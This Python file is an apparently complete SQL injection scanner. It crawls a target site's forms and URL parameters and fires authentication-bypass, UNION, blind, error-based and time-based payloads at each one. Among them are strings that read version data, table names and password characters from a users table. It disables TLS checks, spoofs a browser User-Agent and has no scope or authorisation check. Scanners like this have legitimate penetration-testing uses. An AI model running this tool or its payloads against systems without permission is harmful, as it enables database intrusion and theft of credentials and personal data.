import requests
import logging
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse, quote
import time
import re
import asyncio
import aiohttp
from typing import List, Dict, Set
import difflib
import hashlib
import random
import string
from concurrent.futures import ThreadPoolExecutor
from itertools import combinations

logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self):
        self.seen_responses = set()
        self.response_patterns = {}
        self.successful_payloads = set()
        self.max_workers = 5

    def generate_random_string(self, length: int = 8) -> str:
        """Generate a random string for testing"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def calculate_response_hash(self, response_text: str) -> str:
        """Calculate a normalized hash of the response"""
        # Remove common dynamic content
        normalized = re.sub(r'\b\d{10,}\b', '', response_text)  # Remove long numbers
        normalized = re.sub(r'\b[a-f0-9]{32}\b', '', normalized)  # Remove MD5-like hashes
        normalized = re.sub(r'\b\d{4}-\d{2}-\d{2}\b', '', normalized)  # Remove dates
        return hashlib.md5(normalized.encode()).hexdigest()

    def analyze_response_pattern(self, response_text: str, payload: str) -> Dict:
        """Analyze response for various SQL injection indicators"""
        analysis = {
            'length': len(response_text),
            'hash': self.calculate_response_hash(response_text),
            'error_detected': False,
            'pattern_detected': False,
            'indicators': []
        }

        # Check for SQL errors
        for pattern in SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                analysis['error_detected'] = True
                analysis['indicators'].append(f"SQL error pattern matched: {pattern}")

        # Check for data patterns
        for pattern in DATA_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                analysis['pattern_detected'] = True
                analysis['indicators'].append(f"Data pattern matched: {pattern}")

        return analysis

    def compare_responses(self, original: str, injected: str, false_response: str = None) -> float:
        """Compare responses and return a similarity score"""
        # Use difflib to compare responses
        similarity = difflib.SequenceMatcher(None, original, injected).ratio()
        
        if false_response:
            false_similarity = difflib.SequenceMatcher(None, injected, false_response).ratio()
            # If injected response is significantly different from both original and false
            if similarity < 0.8 and false_similarity < 0.8:
                return 1.0
        
        return similarity

    async def test_parameter(self, session: aiohttp.ClientSession, url: str, method: str, 
                           param_name: str, original_value: str, test_payloads: List[str],
                           other_params: Dict = None) -> List[Dict]:
        """Test a single parameter with multiple payloads"""
        vulnerabilities = []
        base_data = other_params or {}
        original_response = None

        # Get original response
        try:
            if method.lower() == 'get':
                async with session.get(url, params={**base_data, param_name: original_value}, 
                                    ssl=False, timeout=10) as response:
                    original_response = await response.text()
            else:
                async with session.post(url, data={**base_data, param_name: original_value}, 
                                     ssl=False, timeout=10) as response:
                    original_response = await response.text()
        except Exception as e:
            logger.error(f"Error getting original response: {str(e)}")
            return vulnerabilities

        # Test each payload
        for payload in test_payloads:
            try:
                # Prepare test data
                test_value = payload.replace('[VALUE]', original_value)
                
                # Send normal request
                start_time = time.time()
                if method.lower() == 'get':
                    async with session.get(url, params={**base_data, param_name: test_value}, 
                                        ssl=False, timeout=10) as response:
                        response_text = await response.text()
                else:
                    async with session.post(url, data={**base_data, param_name: test_value}, 
                                         ssl=False, timeout=10) as response:
                        response_text = await response.text()
                
                response_time = time.time() - start_time

                # Analyze response
                analysis = self.analyze_response_pattern(response_text, test_value)
                
                # Test with false condition if boolean-based payload
                false_response = None
                if 'TRUE' in payload or '1=1' in payload:
                    false_value = test_value.replace('1=1', '1=2').replace('TRUE', 'FALSE')
                    if method.lower() == 'get':
                        async with session.get(url, params={**base_data, param_name: false_value}, 
                                            ssl=False, timeout=10) as response:
                            false_response = await response.text()
                    else:
                        async with session.post(url, data={**base_data, param_name: false_value}, 
                                             ssl=False, timeout=10) as response:
                            false_response = await response.text()

                # Compare responses
                similarity = self.compare_responses(original_response, response_text, false_response)

                # Check for vulnerability indicators
                is_vulnerable = False
                evidence = []
                
                # Error-based detection
                if analysis['error_detected']:
                    is_vulnerable = True
                    evidence.append("SQL error in response")
                    evidence.extend(analysis['indicators'])

                # Boolean-based detection
                if false_response and similarity < 0.8:
                    is_vulnerable = True
                    evidence.append(f"Different responses for TRUE/FALSE conditions (similarity: {similarity:.2f})")

                # Time-based detection
                if response_time > 5 and ('SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload):
                    is_vulnerable = True
                    evidence.append(f"Time-based injection confirmed (delay: {response_time:.2f}s)")

                # Pattern-based detection
                if analysis['pattern_detected']:
                    is_vulnerable = True
                    evidence.append("Data leakage patterns detected")
                    evidence.extend(analysis['indicators'])

                # Union-based detection
                if 'UNION SELECT' in payload and similarity < 0.95:
                    # Additional check for column count
                    column_count = payload.count('NULL')
                    evidence.append(f"Possible UNION-based injection (columns: {column_count})")
                    is_vulnerable = True

                if is_vulnerable:
                    self.successful_payloads.add(payload)
                    vulnerabilities.append({
                        "type": "SQL Injection",
                        "description": f"SQL injection vulnerability detected in {param_name} parameter",
                        "location": url,
                        "severity": "high",
                        "payload": test_value,
                        "method": method.upper(),
                        "parameter": param_name,
                        "evidence": evidence,
                        "details": {
                            "request": {
                                "method": method.upper(),
                                "url": url,
                                "tested_param": param_name,
                                "payload": test_value
                            },
                            "response": {
                                "time": f"{response_time:.2f}s",
                                "similarity": f"{similarity:.2f}",
                                "analysis": analysis,
                                "evidence": evidence
                            }
                        }
                    })

            except Exception as e:
                logger.error(f"Error testing payload {payload} on {param_name}: {str(e)}")
                continue

        return vulnerabilities

    async def scan_url(self, url: str) -> List[Dict]:
        """Main scanning function"""
        all_vulnerabilities = []
        try:
            # Initialize session with custom headers
            async with aiohttp.ClientSession(headers=CUSTOM_HEADERS) as session:
                # First, crawl the site to find all forms and parameters
                forms = await self.crawl_site(session, url)
                logger.info(f"Found {len(forms)} forms to test")

                # Prepare all test cases
                test_cases = []
                
                # Add URL parameters
                parsed_url = urlparse(url)
                if parsed_url.query:
                    params = parse_qs(parsed_url.query)
                    base_url = url.split('?')[0]
                    for param_name, values in params.items():
                        test_cases.append({
                            'url': base_url,
                            'method': 'get',
                            'param_name': param_name,
                            'original_value': values[0],
                            'other_params': {k: v[0] for k, v in params.items() if k != param_name}
                        })

                # Add form parameters
                for form in forms:
                    for input_name in form['inputs']:
                        test_cases.append({
                            'url': form['action'],
                            'method': form['method'],
                            'param_name': input_name,
                            'original_value': 'test',
                            'other_params': {name: 'test' for name in form['inputs'] if name != input_name}
                        })

                # Test each case with different payload sets
                tasks = []
                for case in test_cases:
                    # Test with different payload sets based on context
                    for payload_set in [AUTHENTICATION_PAYLOADS, UNION_PAYLOADS, BLIND_PAYLOADS, 
                                      ERROR_PAYLOADS, TIME_PAYLOADS]:
                        task = self.test_parameter(
                            session=session,
                            url=case['url'],
                            method=case['method'],
                            param_name=case['param_name'],
                            original_value=case['original_value'],
                            test_payloads=payload_set,
                            other_params=case['other_params']
                        )
                        tasks.append(task)

                # Run all tests concurrently
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Collect results and ensure they're properly formatted
                for result in results:
                    if isinstance(result, list):
                        all_vulnerabilities.extend(result)
                    elif isinstance(result, dict):
                        all_vulnerabilities.append(result)
                    elif isinstance(result, Exception):
                        logger.error(f"Error during scan: {str(result)}")

        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            return [{
                "type": "Scan Error",
                "description": f"Error during scan: {str(e)}",
                "location": url,
                "severity": "error"
            }]

        # Ensure we always return a list
        return all_vulnerabilities if isinstance(all_vulnerabilities, list) else []

    async def crawl_site(self, session: aiohttp.ClientSession, url: str) -> List[Dict]:
        """Crawl the site to find all forms and parameters"""
        forms = []
        try:
            async with session.get(url, ssl=False, timeout=10) as response:
                if response.status != 200:
                    logger.error(f"Failed to fetch {url}. Status code: {response.status}")
                    return forms
                
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    # Get all input fields
                    for input_tag in form.find_all(['input', 'textarea']):
                        input_type = input_tag.get('type', '')
                        input_name = input_tag.get('name')
                        if input_type not in ['submit', 'button', 'image', 'reset', 'file'] and input_name:
                            form_data['inputs'].append(input_name)
                    
                    # Add form if it has inputs
                    if form_data['inputs']:
                        forms.append(form_data)
                        logger.info(f"Found form at {form_data['action']} with inputs: {form_data['inputs']}")
                
        except Exception as e:
            logger.error(f"Error crawling {url}: {str(e)}")
            
        return forms

async def scan(target_url: str) -> List[Dict]:
    """Entry point for the scanner"""
    scanner = SQLInjectionScanner()
    return await scanner.scan_url(target_url)

# Constants and Configurations
CUSTOM_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0'
}

# Sophisticated payload sets
AUTHENTICATION_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' OR 'x'='x",
    "') OR ('x'='x",
    "' OR [VALUE] LIKE '%'--",
    "' OR username LIKE '%admin%'--",
    "' UNION SELECT 'admin', '123'--",
    "') OR EXISTS(SELECT * FROM users WHERE username='admin')--",
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "') UNION SELECT version(),NULL,NULL--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns--",
]

BLIND_PAYLOADS = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(version(),1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50--",
    "' OR EXISTS(SELECT * FROM users)--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
]

ERROR_PAYLOADS = [
    "' AND CAST('[VALUE]' AS SIGNED)=0--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    "' AND updatexml(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
    "' OR (SELECT 6632 FROM(SELECT COUNT(*),CONCAT(0x7176786b71,(SELECT version()),0x7176786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND IF(1=1,SLEEP(5),0)--",
]

# Error patterns for various databases
SQL_ERROR_PATTERNS = [
    # MySQL
    "SQL syntax.*MySQL",
    "Warning.*mysql_.*",
    "MySqlClient\.",
    "valid MySQL result",
    "MariaDB server version",
    "You have an error in your SQL syntax",
    "MySQL server version",
    
    # PostgreSQL
    "PostgreSQL.*ERROR",
    "Warning.*pg_.*",
    "valid PostgreSQL result",
    "Npgsql\.",
    "PG::SyntaxError:",
    "org.postgresql.util.PSQLException",
    
    # Microsoft SQL Server
    "Driver.* SQL[\-_ ]*Server",
    "OLE DB.* SQL Server",
    "SQLServer JDBC Driver",
    "Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
    "ODBC SQL Server Driver",
    "SQLSTATE",
    "SQL Server.*Driver",
    "SQL Server.*[0-9a-fA-F]{8}",
    "Exception.*SQLSTATE",
    
    # Oracle
    "Oracle error",
    "Oracle.*Driver",
    "Warning.*oci_.*",
    "Warning.*ora_.*",
    "ORA-[0-9][0-9][0-9][0-9]",
    
    # SQLite
    "SQLite/JDBCDriver",
    "SQLite.Exception",
    "System.Data.SQLite.SQLiteException",
    "sqlite3.OperationalError:",
    "SQLite error",
    
    # Generic SQL errors
    "SQL syntax.*",
    "mysql_fetch_array()",
    "Syntax error.*in query",
    "mysqli_fetch_array()",
    "pg_fetch_array()",
    "SQL command not properly ended",
    "unexpected end of SQL command",
    "unclosed quotation mark after the character string",
]

# Data leak patterns
DATA_PATTERNS = [
    # Email patterns
    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    
    # Password hashes
    r'[a-fA-F0-9]{32}',  # MD5
    r'[a-fA-F0-9]{40}',  # SHA1
    r'[a-fA-F0-9]{64}',  # SHA256
    
    # Credit card patterns
    r'\b4[0-9]{12}(?:[0-9]{3})?\b',  # Visa
    r'\b5[1-5][0-9]{14}\b',          # MasterCard
    r'\b3[47][0-9]{13}\b',           # American Express
    
    # Social security numbers
    r'\b\d{3}-\d{2}-\d{4}\b',
    
    # Phone numbers
    r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
    
    # Database specific patterns
    r'mysql\.user',
    r'information_schema\.tables',
    r'pg_catalog\.pg_tables',
    r'master\.\.sysdatabases',
    r'MSysObjects',
]
